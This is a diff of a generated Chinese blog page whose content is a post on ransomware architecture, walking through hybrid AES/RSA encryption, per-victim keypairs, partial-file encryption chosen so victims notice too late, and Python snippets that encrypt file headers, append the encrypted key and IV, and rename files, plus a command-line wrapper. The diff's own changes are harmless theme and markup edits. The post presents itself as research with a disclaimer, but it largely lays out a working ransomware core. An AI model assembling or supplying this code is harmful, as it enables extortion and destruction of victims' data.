@@ -14,9 +14,7 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  
-    <meta name="description" content="对常见勒索软件的架构与攻击模式的研究。">
-  
+  <meta name="description" content="对常见勒索软件的架构与攻击模式的研究。">
   <meta name="author" content="寒雨">
   <meta name="keywords" content="">
   
@@ -60,7 +58,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"mundi-xu.github.io","root":"/","version":"1.8.8","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":true},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":"UA-146906922-1","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"mundi-xu.github.io","root":"/","version":"1.8.9a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":"UA-146906922-1","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -258,9 +256,9 @@
 <p>本文的目的仅为分享有关勒索软件恶意软件的知识，任何人不得将其用于恶意目的。</p>
 </blockquote>
 <h1 id="基本加密类型"><a href="#基本加密类型" class="headerlink" title="基本加密类型"></a>基本加密类型</h1><p>在对勒索软件的研究中最重要的概念之一就是它使用的加密类型，其中主流勒索软件均使用以下两种，具体可参阅密码学相关文献。</p>
-<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Symmetric_encryption.png" srcset="/img/loading.gif" alt="Same key for each process"></p>
+<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Symmetric_encryption.png" srcset="/img/loading.gif" lazyload alt="Same key for each process"></p>
 <p>对称加密是大多数人都熟悉的加密技术，其使用同一个密钥来加密或解密数据，常用于zip文件或Office文档之类的加密。</p>
-<h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Asymmetric_encryption.png" srcset="/img/loading.gif" alt="Different keys for each process"></p>
+<h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Asymmetric_encryption.png" srcset="/img/loading.gif" lazyload alt="Different keys for each process"></p>
 <p>非对称加密的具体实现可能较为难以理解，但其应用还是简明易懂的。</p>
 <p>非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。 非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将公钥公开，需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方；甲方再用自己私钥对加密后的信息进行解密。甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密。</p>
 <p>另一方面，甲方可以使用自己的私钥对机密信息进行签名后再发送给乙方；乙方再用甲方的公钥对甲方发送回来的数据进行验签。其目的不是为了保密，而是证明您是发送该消息的人（就像签名在现实生活中一样有效）。甲方只能用其私钥解密由其公钥加密后的任何信息。非对称加密算法的保密性比较好，它消除了最终用户交换密钥的需要。</p>
@@ -271,7 +269,7 @@
 <p>而这就意味着我们必须使用非对称加密来加密受害者文件吗？我们可以生成一个密钥对，在代码上对公共密钥进行硬编码，然后用该密钥对所有内容进行加密（将私有密钥妥善保存）？不，我们不能。</p>
 <p>当您尝试这么干时，一个显而易见的原因就是非对称加密比对称加密要慢几个数量级。当您加密受害者的硬盘时，您需要尽快加密所有内容。如果完全加密文件需要要花费几分钟以上，那么受害者可能会注意到其文件已被加密，而这时只需简单的关闭计算机即可。这将使他能够从硬盘驱动器中保护剩余的文件。</p>
 <p>那么我们应该使用什么呢？</p>
-<h1 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h1><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/%E6%88%91%E5%85%A8%E9%83%BD%E8%A6%81.jpg" srcset="/img/loading.gif" alt="小孩子才做选择,(      )"></p>
+<h1 id="混合加密"><a href="#混合加密" class="headerlink" title="混合加密"></a>混合加密</h1><p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/%E6%88%91%E5%85%A8%E9%83%BD%E8%A6%81.jpg" srcset="/img/loading.gif" lazyload alt="小孩子才做选择,(      )"></p>
 <p>为了解决此问题，我们可以使用混合方法。当生成payload时，我们还将生成与该payload相关联的一组公用/专用密钥。我们在该特定payload中对​​公钥进行编码，并且每当发生感染时，payload都会生成一个用于对称加密的密钥。加密后，我们使用硬编码的公钥对对称密钥进行加密（当然，明文存储的对称密钥会从内存/磁盘中销毁）。这个加密的对称密钥被保存在机器上的某个地方，并在赎金记录中要求受害者提供此密钥。</p>
 <p>但是我们还有另一个问题。</p>
 <h2 id="密钥复用和选择明文攻击"><a href="#密钥复用和选择明文攻击" class="headerlink" title="密钥复用和选择明文攻击"></a>密钥复用和选择明文攻击</h2><p><a target="_blank" rel="noopener" href="https://simple.wikipedia.org/wiki/Chosen-plaintext_attack">选择明文攻击</a>：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。其是一种加密攻击，其中，攻击者在加密之前就知道了明文，并给出了足够大的加密文件样本，从理论上讲，密钥可以从加密结果中得出。大多数文件的header（具有已知格式）都可能发生这种情况。如果我们在给定条件的情况下对所有文件使用相同的密钥，则理论上可以恢复该密钥。这实际上正是DirCrypt发生的事情<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/
@@ -291,40 +289,33 @@
 <li>加密解密密钥：我们还可以将加密解密的密钥附加到每个文件的末尾，这将不用存储每个文件的解密密钥。</li>
 </ol>
 <p>加密的文件结构最终将变成如下所示：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/file_structure.png" srcset="/img/loading.gif" alt="Rough mock up of the file structure after decryption"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/file_structure.png" srcset="/img/loading.gif" lazyload alt="Rough mock up of the file structure after decryption"></p>
 <p>只加密文件的一部分的另一个优点是它允许我们处理同一文件而不是生成新的加密文件并删除旧文件，而这在边界情况下很有用。在这种情况下，我们有权写入现有文件，但不能创建新文件，它还允许我们快速处理非常大的文件（类似500G的MySQL数据库）。</p>
 <h1 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h1><p>为每个进程选择适当的加密方式后，我们将需要设计整体架构来传播此恶意软件，这将涉及自动为每个payload创建一组密钥的过程，因为我们不希望所有受害者共享同一密钥（如果一个人支付了赎金，它可以分发密钥，从而使每个人都可以解密他们的加密文件）。我们还需要保留与每个受害者关联的密钥的数据库。</p>
 <p>为单个payload生成非对称密钥可以使用以下ssh-keygen命令： </p>
 <figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -b 2048 -m pem -f pem<br></code></pre></div></td></tr></table></figure>
 
 <h2 id="开发语言选择"><a href="#开发语言选择" class="headerlink" title="开发语言选择"></a>开发语言选择</h2><p>只要您避免使用特定于操作系统的指令（例如用os.system调用的指令），即跨平台的同时速度也要很快（<del>rust</del>），并且具有我们需要执行的大多数加密操作的库。最后，它最好允许混淆编译后的代码，这样能使最终二进制文件的逆向更加困难。这里我们选择了python(显而易见？)。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/python.png" srcset="/img/loading.gif" alt="python"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/python.png" srcset="/img/loading.gif" lazyload alt="python"></p>
 <p>在选择python库时，我们可能会导入多种看上去功能相同的库，这是为了选择其中最有效的一个，特别是在密码学这种不断变化的领域。毕竟，过时的加密库或者自建的加密方案可能会导致软件的漏洞<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/
 ">[3]</span></a></sup>。我们将使用两个知名的python库：<a target="_blank" rel="noopener" href="https://pypi.org/project/pycryptodome/">pycryptodome</a>和<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/secrets.html">secrets</a>。</p>
 <blockquote>
 <p>实际上，可以使用<a target="_blank" rel="noopener" href="https://pypi.org/project/asymcrypt/">asymcrypt</a>。但是，我将使用直接的pycryptodome并创建每个函数来更好地说明概念。</p>
 </blockquote>
 <h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><ul>
-<li><p><code>generate32ByteKey()</code> ：生成一个随机的32字节密钥,有多种方法可以做到这一点。可以从<code>/dev/urandom</code>抓取一个字符串并对其进行sha256sum运算，但这用于linux，而我们希望软件跨平台，因此我们将使用python的secrets库，通过<code>secrets.token_hex(32)</code>完成。</p>
-</li>
-<li><p><code>rsaEncryptSecret(string，publicKey)</code>：使用公钥非对称加密信息（因此只能使用私钥解密）。这将使我们能够使用publicKey加密每个文件的对称密钥。客户端将使用我们的privateKey解密每个文件的对称密钥，然后使用其自己的对称密钥解密每个文件。</p>
-</li>
-<li><p><code>saDecryptSecret(secret, privateKey)</code>：使用私钥解密加密的对称密钥。</p>
-</li>
-<li><p><code>symEncryptFile(publicKey, file)</code>：此函数是最复杂的函数，其含有具体的加密逻辑，后文将进行进一步说明。但顾名思义，它用于加密文件。</p>
-</li>
-<li><p><code>symDecryptFile(privateKey, file)</code>：解密文件。</p>
-</li>
-<li><p><code>symEncryptDirectory(publicKey, dir)</code>：此函数接收目录作为参数，并遍历目录以获取其中的所有文件。之后，它将使用publicKey调用symEncryptFile。</p>
-</li>
-<li><p><code>symDecryptDirectory(privateKey, dir)</code>：与symEncryptDirectory类似，顾名思义。。。</p>
-<h3 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h3></li>
+<li><code>generate32ByteKey()</code> ：生成一个随机的32字节密钥,有多种方法可以做到这一点。可以从<code>/dev/urandom</code>抓取一个字符串并对其进行sha256sum运算，但这用于linux，而我们希望软件跨平台，因此我们将使用python的secrets库，通过<code>secrets.token_hex(32)</code>完成。</li>
+<li><code>rsaEncryptSecret(string，publicKey)</code>：使用公钥非对称加密信息（因此只能使用私钥解密）。这将使我们能够使用publicKey加密每个文件的对称密钥。客户端将使用我们的privateKey解密每个文件的对称密钥，然后使用其自己的对称密钥解密每个文件。</li>
+<li><code>saDecryptSecret(secret, privateKey)</code>：使用私钥解密加密的对称密钥。</li>
+<li><code>symEncryptFile(publicKey, file)</code>：此函数是最复杂的函数，其含有具体的加密逻辑，后文将进行进一步说明。但顾名思义，它用于加密文件。</li>
+<li><code>symDecryptFile(privateKey, file)</code>：解密文件。</li>
+<li><code>symEncryptDirectory(publicKey, dir)</code>：此函数接收目录作为参数，并遍历目录以获取其中的所有文件。之后，它将使用publicKey调用symEncryptFile。</li>
+<li><code>symDecryptDirectory(privateKey, dir)</code>：与symEncryptDirectory类似，顾名思义。。。</li>
 </ul>
-<p>使用RSA加密密钥，但RSA在默认情况下不会进行任何随机加密，因此我们将使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">最佳非对称加密填充</a>（简称OAEP）。这是一种填充方案，可通过添加随机性和单向置换陷门来改进RSA。需要注意的是，当RSA与OAEP一起使用时，所得的密码大小应与模数相同。模数是密钥大小/8，我们使用的是2048位RSA，因此生成的密文应为256字节。</p>
+<h3 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h3><p>使用RSA加密密钥，但RSA在默认情况下不会进行任何随机加密，因此我们将使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">最佳非对称加密填充</a>（简称OAEP）。这是一种填充方案，可通过添加随机性和单向置换陷门来改进RSA。需要注意的是，当RSA与OAEP一起使用时，所得的密码大小应与模数相同。模数是密钥大小/8，我们使用的是2048位RSA，因此生成的密文应为256字节。</p>
 <p>简单示例：</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):</span><br>    public_key = get_key(publicKey, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># Create the cipher object</span><br>    cipher_rsa = PKCS1_OAEP.new(public_key)<br>    <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span><br>    bytestrings = <span class="hljs-built_in">str</span>.encode(string)<br>    cipher_text = cipher_rsa.encrypt(bytestrings)<br>    <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span><br>    <span class="hljs-comment"># We&#x27;ll base64 encode it for convenience</span><br>    <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span><br>    <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)<br></code></pre></div></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/base64.png" srcset="/img/loading.gif" alt="base64长度计算"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/base64.png" srcset="/img/loading.gif" lazyload alt="base64长度计算"></p>
 <h3 id="RsaDecryptSecret"><a href="#RsaDecryptSecret" class="headerlink" title="RsaDecryptSecret"></a>RsaDecryptSecret</h3><p>使用给定的私钥解密密文：</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):</span><br>    <span class="hljs-comment"># We firts import the private Key</span><br>    private_key = get_key(privateKey, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># Decode the base64 encoded string</span><br>    base64DecodedSecret = base64.b64decode(string)<br>    <span class="hljs-comment"># create the cipher object</span><br>    cipher_rsa = PKCS1_OAEP.new(private_key)<br>    <span class="hljs-comment"># Decrypt the content</span><br>    decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)<br>    <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span><br>    decryptedSecret = decryptedBytestrings.decode()<br>    <span class="hljs-keyword">return</span> decryptedSecret<br></code></pre></div></td></tr></table></figure>
 
@@ -338,11 +329,9 @@
 <li>加密文件的前n个字节并覆盖其内容 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span><br>input_file = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)<br>output_file = <span class="hljs-built_in">open</span>(file + <span class="hljs-string">&#x27;.&#x27;</span> + cryptoName, <span class="hljs-string">&#x27;w+b&#x27;</span>)<br><span class="hljs-comment"># Create the cipher object and encrypt the data</span><br>cipher_encrypt = AES.new(key, AES.MODE_CFB)<br><span class="hljs-comment"># Encrypt file first</span><br>input_file.seek(<span class="hljs-number">0</span>)<br>buffer = input_file.read(buffer_size)<br>ciphered_bytes = cipher_encrypt.encrypt(buffer)<br>input_file.seek(<span class="hljs-number">0</span>)<br>input_file.write(ciphered_bytes)<br></code></pre></div></td></tr></table></figure></li>
 <li>将加密用的随机密钥添加到文件末尾 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br>input_file.write(encriptedKey.encode())<br></code></pre></div></td></tr></table></figure></li>
 <li>在文件末尾附加<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Initialization_vector">AES IV（初始化向量）</a> <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br>input_file.write(cipher_encrypt.iv)<br></code></pre></div></td></tr></table></figure></li>
-<li>重命名文件 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">input_file.close()<br>os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)<br></code></pre></div></td></tr></table></figure>
-
-</li>
+<li>重命名文件 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">input_file.close()<br>os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)<br></code></pre></div></td></tr></table></figure></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Encryption_process.png" srcset="/img/loading.gif" alt="Rough mock up of the file structure"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Mundi-Xu/picture_resource@master/picture/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/Encryption_process.png" srcset="/img/loading.gif" lazyload alt="Rough mock up of the file structure"></p>
 <p>需要注意的是我们并不需要复制完整的文件，我们只是在文件上使用了<code>seek()</code>来定位字节并使过程尽可能快。这也将在解密功能中使用。</p>
 <p>还要注意，由于我们在加密文件中同时写入了AES IV和加密密钥，因此我们不需要任何带有每个加密文件索引的txt文件。受害者可以向我们发送任何文件，只要我们拥有用于特定二进制文件的私钥，我们就可以对其解密。</p>
 <h3 id="SymDecryptFile"><a href="#SymDecryptFile" class="headerlink" title="SymDecryptFile"></a>SymDecryptFile</h3><p>这是主要的解密函数。工作流程如下：</p>
@@ -354,9 +343,7 @@
 <li>读取加密的解密密钥 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bytes before the end of file</span><br><span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span><br>input_file.seek(-<span class="hljs-number">274</span>, os.SEEK_END)<br><span class="hljs-comment"># And we read the 258 bytes of the key</span><br>secret = input_file.read(<span class="hljs-number">258</span>)<br></code></pre></div></td></tr></table></figure></li>
 <li>使用提供的私钥解密加密的密钥  <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)<br></code></pre></div></td></tr></table></figure></li>
 <li>解密我们之前定义的aes加密的缓冲区大小，并将其写入文件的开头 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span><br>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv) <br><span class="hljs-comment"># Read the encrypted header     </span><br>input_file.seek(<span class="hljs-number">0</span>) <br>buffer = input_file.read(buffer_size)<br><span class="hljs-comment"># Decrypt the header with the key</span><br>decrypted_bytes = cipher_encrypt.decrypt(buffer) <br><span class="hljs-comment"># Write the decrypted text on the same file</span><br>input_file.seek(<span class="hljs-number">0</span>)<br>input_file.write(decrypted_bytes)<br></code></pre></div></td></tr></table></figure></li>
-<li>从文件末尾删除iv和加密密钥并重命名 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from the IV + key. </span><br>input_file.seek(-<span class="hljs-number">274</span>, os.SEEK_END)  <br>input_file.truncate()  <br>input_file.close() <br><span class="hljs-comment"># Rename the file to delete the encrypted extension  </span><br>os.rename(file, out_filename)<br></code></pre></div></td></tr></table></figure>
-
-</li>
+<li>从文件末尾删除iv和加密密钥并重命名 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from the IV + key. </span><br>input_file.seek(-<span class="hljs-number">274</span>, os.SEEK_END)  <br>input_file.truncate()  <br>input_file.close() <br><span class="hljs-comment"># Rename the file to delete the encrypted extension  </span><br>os.rename(file, out_filename)<br></code></pre></div></td></tr></table></figure></li>
 </ol>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用上述函数，我们就可以获得想要的最终二进制文件了。如果正确编译了<code>symEncryptDirectory / symDecryptDirectory</code>，则可以选择对参数中的文件夹/文件进行加密或解密，然后仅传递.pem文件。程序的参数选择大致如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">parser = argparse.ArgumentParser()<br><br>parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)<br><br>parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>)<br> <br>parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)<br></code></pre></div></td></tr></table></figure>
@@ -450,7 +437,7 @@
                 
   <div id="gitalk-container"></div>
   <script type="text/javascript">
-    Fluid.utils.waitElementVisible('gitalk-container', function() {
+    Fluid.utils.lazyComments('gitalk-container', function() {
       Fluid.utils.createCssLink('/css/gitalk.css')
       Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
         var gitalk = new Gitalk({
@@ -566,8 +553,9 @@
   
 </footer>
 
-<!-- SCRIPTS -->
 
+  <!-- SCRIPTS -->
+  
   <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
